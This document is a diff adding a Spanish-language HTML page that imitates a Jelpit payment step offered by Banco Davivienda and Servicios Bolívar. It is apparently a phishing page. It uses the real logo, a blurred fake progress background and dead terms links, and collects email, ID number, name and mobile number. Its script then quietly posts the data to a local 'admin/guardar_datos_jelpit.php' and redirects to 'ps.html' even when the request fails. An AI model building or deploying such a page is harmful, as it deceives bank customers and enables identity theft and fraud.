@@ -1,0 +1,361 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Datos - Jelpit</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #f7f7f7;
+        }
+        header {
+            background: linear-gradient(135deg, #2d1b69 0%, #2d1b69 100%);
+            padding: 15px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
+            min-height: 65px;
+        }
+        .logo img { height: 60px; width: auto; }
+        .menu-btn { background: none; border: none; color: white; font-size: 28px; cursor: pointer; padding: 5px; }
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            background: #f7f7f7;
+            min-height: 100vh;
+            filter: blur(3px);
+            pointer-events: none;
+        }
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.4);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            overflow-y: auto;
+        }
+        .modal {
+            background: white;
+            border-radius: 12px;
+            padding: 20px 16px;
+            max-width: 340px;
+            width: 90%;
+            text-align: center;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
+            margin: 20px 0;
+        }
+        .modal-title { font-size: 16px; font-weight: 700; color: #2d1b69; margin-bottom: 6px; letter-spacing: -0.5px; }
+        .modal-subtitle { font-size: 12px; color: #666; margin-bottom: 18px; line-height: 1.5; }
+        .form-group-modal { margin-bottom: 12px; position: relative; text-align: left; }
+        .form-label-modal {
+            position: absolute;
+            top: 14px;
+            left: 12px;
+            font-size: 13px;
+            color: #999;
+            margin: 0;
+            pointer-events: none;
+            transition: all 0.3s ease;
+            font-weight: 400;
+        }
+        .form-input-wrapper-modal {
+            width: 100%;
+            padding: 14px 12px 10px 12px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 13px;
+            font-family: inherit;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            background: white;
+            position: relative;
+        }
+        .form-input-wrapper-modal input,
+        .form-input-wrapper-modal select {
+            border: none;
+            outline: none;
+            flex: 1;
+            font-size: 13px;
+            font-family: inherit;
+            padding: 0;
+            background: transparent;
+            color: #2d1b69;
+            appearance: none;
+        }
+        .form-input-wrapper-modal input::placeholder,
+        .form-input-wrapper-modal select::placeholder { color: transparent; }
+        .form-input-wrapper-modal input:not(:placeholder-shown) ~ .form-label-modal,
+        .form-input-wrapper-modal select:not(:disabled) ~ .form-label-modal {
+            top: 6px;
+            font-size: 10px;
+        }
+        .form-input-wrapper-modal:focus-within { border-color: #00ff88; }
+        .form-input-wrapper-modal:focus-within .form-label-modal { top: 6px; font-size: 10px; }
+        .email-icon { width: 20px; height: 20px; flex-shrink: 0; display: flex; align-items: center; justify-content: center; }
+        .checkbox-group { text-align: left; margin-bottom: 14px; padding-top: 10px; border-top: 1px solid #ddd; font-size: 11px; color: #666; line-height: 1.5; }
+        .checkbox-item { display: flex; gap: 8px; margin-bottom: 10px; align-items: flex-start; }
+        .checkbox-item input[type="checkbox"] { width: 16px; height: 16px; margin-top: 3px; cursor: pointer; flex-shrink: 0; accent-color: #00ff88; }
+        .checkbox-item label { cursor: pointer; flex: 1; }
+        .checkbox-item a { color: #2d1b69; text-decoration: none; font-weight: 600; }
+        .checkbox-item a:hover { text-decoration: underline; }
+        .btn-continue-modal {
+            width: 100%;
+            padding: 12px;
+            background: #999;
+            color: white;
+            border: none;
+            border-radius: 25px;
+            font-weight: 700;
+            font-size: 14px;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-family: inherit;
+            margin-top: 8px;
+        }
+        .btn-continue-modal:hover:not(:disabled) { background: #888; transform: scale(1.02); }
+        .btn-continue-modal:disabled { background: #ddd; color: #999; cursor: not-allowed; transform: scale(1); }
+        footer { background: #2d1b69; padding: 30px 20px; color: white; filter: blur(3px); pointer-events: none; }
+        .footer-content { max-width: 500px; margin: 0 auto; }
+        .footer-subtitle { font-size: 11px; color: rgba(255, 255, 255, 0.8); margin-bottom: 20px; line-height: 1.5; }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="logo">
+            <img src="https://web-conjuntos.jelpit.com/d40c5d3bac09ee9fa209ef21692439f5.svg" alt="Jelpit Logo">
+        </div>
+        <button class="menu-btn">☰</button>
+    </header>
+
+    <div class="container">
+        <div style="padding: 15px 20px; display: flex; align-items: center; gap: 10px; color: #2d1b69; font-size: 14px;">
+            <span>← Atrás</span>
+        </div>
+        <div style="display: flex; justify-content: center; align-items: flex-start; padding: 15px 20px; gap: 15px; position: relative; margin-top: 10px;">
+            <div style="display: flex; flex-direction: column; align-items: center; gap: 8px;">
+                <div style="width: 50px; height: 50px; border: 2.5px solid #2d1b69; border-radius: 50%; display: flex; align-items: center; justify-content: center; background: #2d1b69; margin-top: 3px;">
+                    <div style="width: 40px; height: 40px; border-radius: 50%; background: #2d1b69; display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 20px; color: white;">✓</div>
+                </div>
+                <div style="font-size: 11px; font-weight: 700; color: #2d1b69; text-align: center;">Buscar</div>
+            </div>
+            <div style="width: 60px; height: 2px; background: #ddd; margin: 25px -15px 0 -15px;"></div>
+            <div style="display: flex; flex-direction: column; align-items: center; gap: 8px;">
+                <div style="width: 50px; height: 50px; border: 2.5px solid #2d1b69; border-radius: 50%; display: flex; align-items: center; justify-content: center; background: #2d1b69; margin-top: 3px;">
+                    <div style="width: 40px; height: 40px; border-radius: 50%; background: #2d1b69; display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 20px; color: white;">✓</div>
+                </div>
+                <div style="font-size: 11px; font-weight: 700; color: #2d1b69; text-align: center;">Verificar</div>
+            </div>
+            <div style="width: 60px; height: 2px; background: #ddd; margin: 25px -15px 0 -15px;"></div>
+            <div style="display: flex; flex-direction: column; align-items: center; gap: 8px;">
+                <div style="width: 50px; height: 50px; border: 2.5px solid #ddd; border-radius: 50%; display: flex; align-items: center; justify-content: center; background: #f7f7f7; margin-top: 3px;">
+                    <div style="width: 40px; height: 40px; border-radius: 50%; background: #f7f7f7; display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 16px; color: #999;">3</div>
+                </div>
+                <div style="font-size: 11px; font-weight: 700; color: #999; text-align: center;">Pagar</div>
+            </div>
+        </div>
+    </div>
+
+    <div class="modal-overlay" id="modalOverlay">
+        <div class="modal" id="emailModal">
+            <h2 class="modal-title">Ingresa tu correo electrónico</h2>
+            <p class="modal-subtitle">De esta forma reconocemos tu usuario</p>
+
+            <div class="form-group-modal">
+                <div class="form-input-wrapper-modal">
+                    <input type="email" id="emailInput" placeholder=" ">
+                    <svg class="email-icon" viewBox="0 0 24 24" fill="#2d1b69">
+                        <path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/>
+                    </svg>
+                    <label class="form-label-modal" for="emailInput">Correo Electrónico</label>
+                </div>
+            </div>
+
+            <button class="btn-continue-modal" id="btnContinueEmail" disabled onclick="continueToForm()">Continuar</button>
+        </div>
+
+        <div class="modal" id="paymentModal" style="display: none;">
+            <h2 class="modal-title">Datos para el pago</h2>
+            <p class="modal-subtitle">Ingresa tus datos para continuar</p>
+
+            <div class="form-group-modal">
+                <div class="form-input-wrapper-modal">
+                    <select id="tipoId" placeholder=" ">
+                        <option value="">Selecciona</option>
+                        <option value="cc">Cédula de Ciudadanía</option>
+                        <option value="ce">Cédula de Extranjería</option>
+                        <option value="pp">Pasaporte</option>
+                        <option value="nit">NIT</option>
+                    </select>
+                    <label class="form-label-modal" for="tipoId">Tipo de identificación</label>
+                </div>
+            </div>
+
+            <div class="form-group-modal">
+                <div class="form-input-wrapper-modal">
+                    <input type="text" id="numeroId" placeholder=" ">
+                    <label class="form-label-modal" for="numeroId">Número de identificación</label>
+                </div>
+            </div>
+
+            <div class="form-group-modal">
+                <div class="form-input-wrapper-modal">
+                    <input type="text" id="nombre" placeholder=" ">
+                    <label class="form-label-modal" for="nombre">Nombre</label>
+                </div>
+            </div>
+
+            <div class="form-group-modal">
+                <div class="form-input-wrapper-modal">
+                    <input type="text" id="apellido" placeholder=" ">
+                    <label class="form-label-modal" for="apellido">Apellido</label>
+                </div>
+            </div>
+
+            <div class="form-group-modal">
+                <div class="form-input-wrapper-modal">
+                    <input type="tel" id="celular" placeholder=" ">
+                    <label class="form-label-modal" for="celular">Número de celular</label>
+                </div>
+            </div>
+
+            <div class="checkbox-group">
+                <div style="font-size: 11px; color: #999; margin-bottom: 15px;">
+                    Servicio ofrecido por Banco Davivienda S.A. y<br>
+                    operado por Servicios Bolívar S.A.
+                </div>
+
+                <div class="checkbox-item">
+                    <input type="checkbox" id="terminos">
+                    <label for="terminos">Acepto <a href="#" onclick="return false;">Términos y Condiciones</a> del portal.</label>
+                </div>
+
+                <div class="checkbox-item">
+                    <input type="checkbox" id="datosPersonales">
+                    <label for="datosPersonales">Acepto la <a href="#" onclick="return false;">Autorización de tratamiento de Datos Personales</a>.</label>
+                </div>
+
+                <div class="checkbox-item">
+                    <input type="checkbox" id="ofertas">
+                    <label for="ofertas">Me interesa recibir ofertas de productos financieros y por ello autorizo la <a href="#" onclick="return false;">consulta en Operadores de Información</a>.</label>
+                </div>
+            </div>
+
+            <button class="btn-continue-modal" id="btnContinuePayment" disabled onclick="submitPaymentForm()">Continuar</button>
+        </div>
+    </div>
+
+    <footer>
+        <div class="footer-content">
+            <div class="footer-subtitle">
+                Servicio ofrecido por Banco Davivienda S.A. y<br>
+                operado por Servicios Bolívar S.A.
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        function isValidEmail(email) {
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return emailRegex.test(email);
+        }
+
+        document.getElementById('emailInput').addEventListener('input', function() {
+            const email = this.value;
+            const btnContinue = document.getElementById('btnContinueEmail');
+            
+            if (isValidEmail(email)) {
+                btnContinue.disabled = false;
+                btnContinue.style.background = '#2d1b69';
+            } else {
+                btnContinue.disabled = true;
+                btnContinue.style.background = '#ddd';
+            }
+        });
+
+        function continueToForm() {
+            const email = document.getElementById('emailInput').value;
+            if (isValidEmail(email)) {
+                sessionStorage.setItem('email', email);
+                document.getElementById('emailModal').style.display = 'none';
+                document.getElementById('paymentModal').style.display = 'block';
+            }
+        }
+
+        function validatePaymentForm() {
+            const tipoId = document.getElementById('tipoId').value;
+            const numeroId = document.getElementById('numeroId').value.trim();
+            const nombre = document.getElementById('nombre').value.trim();
+            const apellido = document.getElementById('apellido').value.trim();
+            const celular = document.getElementById('celular').value.trim();
+            const terminos = document.getElementById('terminos').checked;
+
+            const btnContinue = document.getElementById('btnContinuePayment');
+            
+            if (tipoId && numeroId && nombre && apellido && celular && terminos) {
+                btnContinue.disabled = false;
+                btnContinue.style.background = '#2d1b69';
+            } else {
+                btnContinue.disabled = true;
+                btnContinue.style.background = '#ddd';
+            }
+        }
+
+        document.getElementById('tipoId').addEventListener('change', validatePaymentForm);
+        document.getElementById('numeroId').addEventListener('input', validatePaymentForm);
+        document.getElementById('nombre').addEventListener('input', validatePaymentForm);
+        document.getElementById('apellido').addEventListener('input', validatePaymentForm);
+        document.getElementById('celular').addEventListener('input', validatePaymentForm);
+        document.getElementById('terminos').addEventListener('change', validatePaymentForm);
+
+        // ============ ENVIAR DATOS SIN ALERTAS ============
+        function submitPaymentForm() {
+            const email = document.getElementById('emailInput').value;
+            const tipoId = document.getElementById('tipoId').value;
+            const numeroId = document.getElementById('numeroId').value;
+            const nombre = document.getElementById('nombre').value;
+            const apellido = document.getElementById('apellido').value;
+            const celular = document.getElementById('celular').value;
+
+            const datos = {
+                email: email,
+                tipoId: tipoId,
+                numeroId: numeroId,
+                nombre: nombre,
+                apellido: apellido,
+                celular: celular
+            };
+
+            console.log('📤 Enviando datos:', datos);
+
+            fetch('admin/guardar_datos_jelpit.php', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(datos)
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('✅ Respuesta:', data);
+                // Redirigir a ps.html siempre
+                window.location.href = 'ps.html';
+            })
+            .catch(error => {
+                console.error('❌ Error:', error);
+                // Redirigir a ps.html incluso si hay error
+                window.location.href = 'ps.html';
+            });
+        }
+    </script>
+</body>
+</html>
